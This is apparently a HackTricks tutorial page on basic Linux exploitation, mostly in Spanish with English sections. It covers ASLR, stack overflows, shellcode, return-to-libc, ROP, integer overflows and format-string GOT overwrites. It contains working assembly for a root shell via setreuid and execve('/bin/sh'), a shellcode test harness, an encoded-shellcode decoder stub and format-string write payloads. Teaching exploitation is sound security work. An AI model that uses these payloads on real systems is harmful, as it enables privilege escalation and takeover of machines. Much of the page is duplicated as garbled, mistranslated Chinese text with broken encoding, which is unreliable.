# Linux Exploiting (Basic) (SPA)

ï¼ƒLinuxæ¼æ´åˆ©ç”¨ï¼ˆåŸºæœ¬ï¼‰ï¼ˆSPAï¼‰

## Linux Exploiting (Basic) (SPA)

## Linuxæ¼æ´åˆ©ç”¨ï¼ˆåŸºæœ¬ï¼‰ï¼ˆSPAï¼‰

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

*æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

*å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

*è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰
* **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

** **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

***é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>

## **ASLR**

AleatorizaciÃ³n de direcciones

**Desactiva aleatorizacion(ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivar aletorizacion GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desactivar para una ejecuciÃ³n** (no requiere root):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**Desactivar protecciÃ³n de ejecuciÃ³n en pila**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

/etc/security/limits.conf-> \*è½¯æ ¸å¿ƒæ— é™

**Text**\

**æ–‡æœ¬**\
**Data**\
**BSS**\
**Heap**

**Stack**

**SecciÃ³n BSS**: Variables globales o estÃ¡ticas sin inicializar

```
static int i;
```

**SecciÃ³n DATA**: Variables globales o estÃ¡ticas inicializadas

```
int i = 5;
```

**SecciÃ³n TEXT**: Instrucciones del cÃ³digo (opcodes)

**SecciÃ³n HEAP**: Buffer reservados de forma dinÃ¡nima (malloc(), calloc(), realloc() )

**SecciÃ³n STACK**: La pila (Argumentos pasados, cadenas de entorno (env), variables localesâ€¦)

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Fallo de segmentaciÃ³n o violaciÃ³n de segmento: Cuando se intenta acceder a una direcciÃ³n de memoria que no ha sido asignada al proceso.

Para obtener la direcciÃ³n de una funciÃ³n dentro de un programa se puede hacer:

```
objdump -d ./PROGRAMA | grep FUNCION
```

## ROP

### Call to sys\_execve

###è‡´ç”µsys \ _execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)

[rop-syscall-execv.md]ï¼ˆrop-syscall-execv.mdï¼‰
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\

execveï¼ˆâ€œ/bin/shâ€ï¼Œargs \ []ï¼Œnullï¼‰; // \ _ \ _ nr \ _execve 11 \
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** â€”> Nos devuelve un .o\

** nasm -f elf assembly.asm **  - > nos devuelve un .o \
**ld assembly.o -o shellcodeout** â€”> Nos da un ejecutable formado por el cÃ³digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**

```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
            void (*fp) (void);
            fp = (void *)shellcode;
            fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```

Para ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en **strace ./PROGRAMA\_COMPILADO**

A la hora de crear shellcodes se puede realizar un truco. La primera instrucciÃ³n es un jump a un call. El call llama al cÃ³digo original y ademÃ¡s mete en el stack el EIP. DespuÃ©s de la instrucciÃ³n call hemos metido el string que necesitÃ¡semos, por lo que con ese EIP podemos seÃ±alar al string y ademÃ¡s continuar ejecutando el cÃ³digo.

EJ **TRUCO (/bin/sh)**:

ej ** trucoï¼ˆ/bin/shï¼‰**ï¼š

```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax            
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```

**EJ usando el Stack(/bin/sh):**

** ej usando el Stackï¼ˆ/bin/shï¼‰ï¼š**

```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```

**EJ FNSTENV:**

```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```

**Egg Huter:**

Consiste en un pequeÃ±o cÃ³digo que recorre las pÃ¡ginas de memoria asociadas a un proceso en busca de la shellcode ahi guardada (busca alguna firma puesta en la shellcode). Ãštil en los casos en los que solo se tiene un pequeÃ±o espacio para inyectar cÃ³digo.

**Shellcodes polimÃ³rficos**

Consisten el shells cifradas que tienen un pequeÃ±o cÃ³digos que las descifran y saltan a Ã©l, usando el truco de Call-Pop este serÃ­a un **ejemplo cifrado cesar**:

```
global _start
_start:
            jmp short magic
init:
            pop     esi
            xor      ecx, ecx
            mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
            sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
            sub     cl, 1
            jnz       desc
            jmp     short sc
magic:
            call init
sc:
            ;AquÃ­ va el shellcode
```

1. **Atacando el Frame Pointer (EBP)**

Ãštil en una situaciÃ³n en la que podemos modificar el EBP pero no el EIP.

Se sabe que al salir de una funciÃ³n se ejecuta el siguente cÃ³digo ensamblador:

```
movl               %ebp, %esp
popl                %ebp
ret
```

De esta forma, si se puede modificar el EBP al salir de una funciÃ³n (fvuln) que ha sido llamada por otra funciÃ³n, cuando la funciÃ³n que llamÃ³ a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde estÃ© la direcciÃ³nd e la shellcode + 4 (hay que sumarle 4 por el pop). AsÃ­, al salir de la funciÃ³n, se meterÃ¡ en ESP el valor de &(\&Shellcode)+4, con el pop se le restarÃ¡ 4 al ESP y este apuntarÃ¡ a la direcciÃ³n de la shellcode cuando se ejcute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\

**é€ä¸ªåˆ©ç”¨** \
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcciÃ³n de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. MÃ©todos return to Libc**

MÃ©todo Ãºtil cuando el stack no es ejecutable o deja un buffer muy pequeÃ±o para modificar.

El ASLR provoca que en cada ejecuciÃ³n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este mÃ©todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa estÃ¡ siendo ejecutado constantemente en la misma direcciÃ³n sÃ­ puede ser Ãºtil.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la funciÃ³n limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la funciÃ³n llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la direcciÃ³n de la instrucciÃ³n system de libc y se le pasa como argumento el string â€œ/bin/shâ€, normalmente desde una variable de entorno. AdemÃ¡s, se usa la direcciÃ³n a la funciÃ³n exit para que una vez que no se requiera mÃ¡s la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

**å¯¼å‡ºå£³=/bin/sh **

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** â€”> Da la direcciÃ³n de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** â€”> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedarÃ­a:

â€œAâ€ \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentaciÃ³n) + DirecciÃ³n de **system** (sobreescribirÃ¡ el EIP) + DirecciÃ³n de **exit** (al salir de system(â€œ/bin/shâ€) se llamarÃ¡ a esta funciÃ³n pues los primero 4bytes del stack son tratados como la siguiente direcciÃ³n del EIP a ejecutar) + DirecciÃ³n de â€œ**/bin/sh**â€ (serÃ¡ el parÃ¡metro pasado a system)

De esta forma el EIP se sobreescribirÃ¡ con la direcciÃ³n de system la cual recibirÃ¡ como parÃ¡metro el string â€œ/bin/shâ€ y al salir de este ejecutarÃ¡ la funciÃ³n exit().

Es posible encontrarse en la situaciÃ³n de que algÃºn byte de alguna direcciÃ³n de alguna funciÃ³n sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funciÃ³n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funciÃ³n directamente (por ejemplo con > x/8i system-4).

Este mÃ©todo funciona pues al llamar a una funciÃ³n como system usando el opcode **ret** en vez de **call**, la funciÃ³n entiende que los primeros 4bytes serÃ¡n la direcciÃ³n **EIP** a la que volver.

Una tÃ©cnica interesante con este mÃ©todo es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra tÃ©cnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o servÃ­a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuciÃ³n). Con este ataque se podrÃ­a volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

BasÃ¡ndonos en la tÃ©cnica anterior, esta forma de exploit consiste en:\
Relleno + \&FunciÃ³n1 + \&pop;ret; + \&arg\_fun1 + \&FunciÃ³n2 + \&pop;ret; + \&arg\_fun2 + â€¦

De esta forma se pueden encadenar funciones a las que llamar. AdemÃ¡s, si se quieren usar funciones con varios argumentos, se pueden poder los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar direcciÃ³n a un sitio con opcodes: pop, pop, pop, pop, ret â€”> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuciÃ³n de varias funciones a travÃ©s del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2Âº EBP\_falso + la funciÃ³n a ejecutar: (\&system() + \&leave;ret + &â€œ/bin/shâ€)
* En el EIP ponemos de direcciÃ³n una funciÃ³n &(leave;ret)

Iniciamos la shellcode con la direcciÃ³n a la siguiente parte de la shellcode, por ej: 2ÂºEBP\_falso + \&system() + &(leave;ret;) + &â€/bin/shâ€

el 2ÂºEBP serÃ­a: 3ÂºEBP\_falso + \&system() + &(leave;ret;) + &â€/bin/lsâ€

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguirÃ¡ una shellcode fÃ¡cilmente divisible por pequeÃ±os trozos de memoria.

(Se encadena la ejecuciÃ³n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.MÃ©todos complementarios**

**Ret2Ret**

Ãštil para cuando no se puede meter una direcciÃ³n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaciÃ³n de la shellcode. Pero, la funciÃ³n vulnerable acepte un parÃ¡metro (la shellcode irÃ¡ aquÃ­).

De esta forma, al cambiar el EIP por una direcciÃ³n a un **ret**, se cargarÃ¡ la siguiente direcciÃ³n (que es la direcciÃ³n del primer argumento de la funciÃ³n). Es decir, se cargarÃ¡ la shellcode.

El exploit quedarÃ­a: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcciÃ³n al parÃ¡metro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la direcciÃ³n donde estaba guardada la shellcode imposibilitando esta tÃ©cnica. Es decir, la direcciÃ³n que pasan a la funciÃ³n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.

```
        **Ret2PopRet**
```

Si no tenemos control sobre el primer argumento pero sÃ­ sobre el segundo o el tercero, podemos sobreescribir EIP con una direcciÃ³n a pop-ret o pop-pop-ret, segÃºn la que necesitemos.

**TÃ©cnica de Murat**

En linux todos los progamas se mapean comenzando en 0xbfffffff

Viendo como se construye la pila de un nuevo proceso en linux se puede desarrollar un exploit de forma que programa sea arrancado en un entorno cuya Ãºnica variable sea la shellcode. La direcciÃ³n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

De esta forma se obtendrÃ­a de forma sensilla la direcciÃ³n donde estÃ¡ la variable de entorno con la shellcode.

Esto se puede hacer gracias a que la funciÃ³n execle permite crear un entorno que solo tenga las variables de entorno que se deseen

**Jump to ESP: Windows Style**

**è·³åˆ°ESPï¼šWindowsæ ·å¼**

Debido a que el ESP estÃ¡ apuntando al comienzo del stack siempre, esta tÃ©cnica consiste con sustituir el EIP con la direcciÃ³n a una llamada a **jmp esp** o **call esp**. De esta forma, se guarda la shellcode despuÃ©s de la sobreescritura del EIP ya que despuÃ©s de ejecutar el **ret** el ESP se encontrarÃ¡ apuntando a la direcciÃ³n siguiente, justo donde se ha guardado la shellcode.

En caso de que no se tenga el ASLR activo en Windows o Linux se puede llamar a **jmp esp** o **call esp** almacenadas en algÃºn objeto compartido. En caso de que estÃ© el ASLR, se podrÃ­a buscar dentro del propio programa vulnerable.

AdemÃ¡s, el hecho de poder colocar la shellcode despuÃ©s de la corrupciÃ³n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funciÃ³n no lleguen a tocar la shellcode (cosa que podrÃ­a ocurrir en caso de ponerse en medio del stack de la funciÃ³n).

De forma muy similar a esto si sabemos que una funciÃ³n devuelve la direcciÃ³n donde estÃ¡ guardada la shellcode se puede llamar a **call eax** o **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) o borrowed code chunks**

** ropï¼ˆè¿”å›çš„ç¼–ç¨‹ï¼‰oå€Ÿç”¨çš„ä»£ç å—**

Los trozos de cÃ³digo que se invocan se conocen como gadgets.

Esta tÃ©cnica consiste en encadenar distintas llamadas a funciones mediante la tÃ©cnica de **ret2libc** y el uso de **pop,ret**.

En algunas arquitecturas de procesadores cada instrucciÃ³n es un conjunto de 32bits (MIPS por ej). Sin embargo, en Intel las instrucciones son de tamaÃ±o variable y varias instrucciones pueden compartir un conjunto de bits, por ejemplo:

**movl $0xe4ff, -0x(%ebp)** â€”> Contiene los bytes 0xffe4 que tambiÃ©n se traducen por: **jmp \*%esp**

De esta forma se pueden ejecutar algunas instrucciones que realmente ni si quiera estÃ¡ en el programa original

**ROPgadget.py** nos ayuda a encontrar valores en binarios

Este programa tambiÃ©n sirve para crear los **payloads**. Le puedes dar la librerÃ­a de la que quieres sacar los ROPs y Ã©l generarÃ¡ un payload en python al cual tu le das la direcciÃ³n en la que estÃ¡ dicha librerÃ­a y el payload ya estÃ¡ listo para ser usado como shellcode. AdemÃ¡s, como usa llamadas al sistema no ejecuta realmente nada en el stack sino que solo va guardando direcciones de ROPs que se ejecutarÃ¡n mediante **ret**. Para usar este payload hay que llamar al payload mediante una instrucciÃ³n **ret**.

**Integer overflows**

**æ•´æ•°æº¢å‡º**

Este tipo de overflows se producen cuando una variable no estÃ¡ preparada para soportar un nÃºmero tan grande como se le pasa, posiblemente por una confusiÃ³n entre variables con y sin signo, por ejemplo:

```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```

En el ejemplo anterior vemos que el programa se espera 2 parÃ¡metros. El primero la longitud de la siguiente cadena y el segundo la cadena.

Si le pasamos como primer parÃ¡metro un nÃºmero negativo saldrÃ¡ que len < 256 y pasaremos ese filtro, y ademÃ¡s tambiÃ©n strlen(buffer) serÃ¡ menor que l, pues l es unsigned int y serÃ¡ muy grande.

Este tipo de overflows no busca lograr escribir algo en el proceso del programa, sino superar filtros mal diseÃ±ados para explotar otras vulnerabilidades.

**Variables no inicializadas**

No se sabe el valor que puede tomar una variable no inicializada y podrÃ­a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funciÃ³n anterior y esta sea controlada por el atacante.

## **Format Strings**

## **æ ¼å¼å­—ç¬¦ä¸²**

In C **`printf`** is function that can be used to **print** some string. The **first parameter** this function expects is the **raw text with the formatters**. The **following parameters** expected are the **values** to **substitute** the **formatters** from the raw text.

åœ¨c **``printf` ** isæ˜¯å‡½æ•°ï¼Œå¯ç”¨äº**æ‰“å°**ä¸€äº›å­—ç¬¦ä¸²ã€‚ **ç¬¬ä¸€ä¸ªå‚æ•°**æ­¤å‡½æ•°æœŸæœ›çš„æ˜¯å¸¦æœ‰æ ¼å¼åŒ–å™¨**çš„**åŸå§‹æ–‡æœ¬ã€‚ **ä»¥ä¸‹å‚æ•°**é¢„æœŸçš„æ˜¯**å€¼** to **æ›¿æ¢** ** formatters **ä»åŸå§‹æ–‡æœ¬ä¸­**ã€‚

The vulnerability appears when an **attacker text is put as the first argument** to this function. The attacker will be able to craft a **special input abusing** the **printf format** string capabilities to **write any data in any address**. Being able this way to **execute arbitrary code**.

å½“å°†**æ”»å‡»è€…æ–‡æœ¬ä½œä¸ºæ­¤åŠŸèƒ½çš„ç¬¬ä¸€ä¸ªå‚æ•°**æ—¶ï¼Œä¼šå‡ºç°æ¼æ´ã€‚ æ”»å‡»è€…å°†èƒ½å¤Ÿåˆ¶ä½œ**ç‰¹æ®Šè¾“å…¥æ»¥ç”¨** ** printfæ ¼å¼**å­—ç¬¦ä¸²åŠŸèƒ½**åœ¨ä»»ä½•åœ°å€ä¸­å†™å…¥ä»»ä½•æ•°æ®**ã€‚ èƒ½å¤Ÿè¿™æ ·**æ‰§è¡Œä»»æ„ä»£ç **ã€‚

Fomatters:

```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```

**`%n`** **writes** the **number of written bytes** in the **indicated address. Writing** as much **bytes** as the hex number we **need** to write is how you can **write any data**.

**`ï¼…n` ** **å†™ä¸‹** **æŒ‡å®šåœ°å€ä¸­çš„ä¹¦é¢å­—èŠ‚æ•°**ã€‚ ç¼–å†™** bytes **ä¸åå…­è¿›åˆ¶æ•°å­—ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦**å†™ä½œæ˜¯å¦‚ä½•**ç¼–å†™ä»»ä½•æ•°æ®**çš„æ–¹å¼ã€‚

```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```

### \*\*GOT (Global Offsets Table) / PLT (\*\*Procedure Linkage Table)

### \*\*gotï¼ˆå…¨å±€åç§»è¡¨ï¼‰ / pltï¼ˆ\*\*è¿‡ç¨‹é“¾æ¥è¡¨ï¼‰

This is the table that contains the **address** to the **external functions** used by the program.

è¿™æ˜¯åŒ…å«**å¤–éƒ¨å‡½æ•°**çš„**åœ°å€**çš„è¡¨ã€‚

Get the address to this table with: **`objdump -s -j .got ./exec`**

ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è·å–æ­¤è¡¨çš„åœ°å€ï¼š

![](<../../.gitbook/assets/image (619).png>)

Observe how after **loading** the **executable** in GEF you can **see** the **functions** that are in the **GOT**: `gefâ¤ x/20x 0xDIR_GOT`

è§‚å¯Ÿ**åŠ è½½**å¦‚ä½•**å¯æ‰§è¡Œ**æ‚¨å¯ä»¥**çœ‹åˆ°** ** function ** ** got ** **ï¼š`gefâ¤x/20x 0xdir_got`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Using GEF you can **start** a **debugging** session and execute **`got`** to see the got table:

ä½¿ç”¨GEFï¼Œæ‚¨å¯ä»¥** start ** a **è°ƒè¯•**ä¼šè¯å¹¶æ‰§è¡Œ**````got'''**æŸ¥çœ‹got tableï¼š

![](<../../.gitbook/assets/image (621).png>)

In a binary the GOT has the **addresses to the functions or** to the **PLT** section that will load the function address. The goal of this exploit is to **override the GOT entry** of a function that is going to be executed later **with** the **address** of the PLT of the **`system`** **function**. Ideally, you will **override** the **GOT** of a **function** that is **going to be called with parameters controlled by you** (so you will be able to control the parameters sent to the system function).

åœ¨äºŒè¿›åˆ¶ä¸­ï¼Œgotå…·æœ‰â€œå‡½æ•°â€çš„**åœ°å€ï¼Œæˆ–è€…** to ** plt **éƒ¨åˆ†å°†åŠ è½½å‡½æ•°åœ°å€ã€‚ æ­¤æ¼æ´çš„ç›®çš„æ˜¯**è¦†ç›–ä¸€ä¸ªå‡½æ•°çš„GOTè¾“å…¥**ï¼Œè¯¥å‡½æ•°å°†åœ¨ä»¥åä½¿ç”¨** ** pltçš„**åœ°å€** **``System' ** ** ** ** åŠŸèƒ½**ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæ‚¨å°†**æ›¿ä»£** ** ** a **å‡½æ•°** **å°†ç”±æ‚¨æ§åˆ¶çš„å‚æ•°æ¥è°ƒç”¨**ï¼ˆå› æ­¤æ‚¨å°†èƒ½å¤Ÿæ§åˆ¶å‘é€åˆ°è¯¥å‚æ•° ç³»ç»ŸåŠŸèƒ½ï¼‰ã€‚

If **`system`** **isn't used** by the script, the system function **won't** have an entry in the GOT. In this scenario, you will **need to leak first the address** of the `system` function.

å¦‚æœ**``system` ** **''è„šæœ¬æœªä½¿ç”¨**ï¼Œåˆ™ç³»ç»Ÿå‡½æ•°**ä¸ä¼š**åœ¨gotä¸­è¾“å…¥ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°†**é¦–å…ˆæ³„æ¼â€œç³»ç»Ÿâ€åŠŸèƒ½çš„åœ°å€**ã€‚

**Procedure Linkage Table** is a **read only** table in ELF file that stores all necessary **symbols that need a resolution**. When one of these functions are called the **GOT** will **redirect** the **flow** to the **PLT** so it can **resolve** the **address** of the function and write it on the GOT.\

**è¿‡ç¨‹é“¾æ¥è¡¨**æ˜¯ä¸€ä¸ª**ä»…è¯»**åœ¨ELFæ–‡ä»¶ä¸­å­˜å‚¨æ‰€æœ‰å¿…è¦çš„**éœ€è¦åˆ†è¾¨ç‡**çš„ç¬¦å·ã€‚ å½“è¿™äº›åŠŸèƒ½ä¹‹ä¸€ç§°ä¸º** got **å°†**é‡å®šå‘** **æµ** ** plt **ï¼Œå› æ­¤å¯ä»¥**è§£å†³** ** **åœ°å€**å‡½æ•°å’Œ å°†å…¶å†™åœ¨gotä¸Šã€‚\ \
Then, the **next time** a call is performed to that address the **function** is **called directly** without needing to resolve it.

ç„¶åï¼Œ**ä¸‹æ¬¡**å°†ç›´æ¥è°ƒç”¨**å‡½æ•°**çš„å‘¼å«ï¼Œè€Œæ— éœ€è§£å†³å®ƒã€‚

You can see the PLT addresses with **`objdump -j .plt -d ./vuln_binary`**

æ‚¨å¯ä»¥ä½¿ç”¨**``objdump -j .plt -d ./vuln_binary``æ‚¨å¯ä»¥çœ‹åˆ°PLTåœ°å€''

### **Exploit Flow**

### **åˆ©ç”¨æµ**

As explained before the goal is going to be to **overwrite** the **address** of a **function** in the **GOT** table that is going to be called later. Ideally we could set the **address to a shellcode** located in a executable section, but highly probable you won't be able to write a shellcode in a executable section.\

å¦‚åœ¨ç›®æ ‡ä¹‹å‰æ‰€è§£é‡Šçš„é‚£æ ·ï¼Œ**è¦†ç›–** **å‡½æ•°**çš„** function ** ** got **è¡¨ä¸­çš„**å‡½æ•°**ï¼Œç¨åå°†è°ƒç”¨ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†**åœ°å€è®¾ç½®ä¸ºä½äºå¯æ‰§è¡Œéƒ¨åˆ†ä¸­çš„shellCode **ï¼Œä½†æ˜¯å¾ˆå¯èƒ½æ‚¨æ— æ³•åœ¨å¯æ‰§è¡Œçš„éƒ¨åˆ†ä¸­ç¼–å†™shellcodeã€‚
So a different option is to **overwrite** a **function** that **receives** its **arguments** from the **user** and **point** it to the **`system`** **function**.

å› æ­¤ï¼Œä¸€ä¸ªä¸åŒçš„é€‰æ‹©æ˜¯**è¦†ç›–** a **å‡½æ•°** **æ¥æ”¶**å®ƒçš„**å‚æ•°**æ¥è‡ª**ç”¨æˆ·**å’Œ** point **å®ƒ ** **åŠŸèƒ½**ã€‚

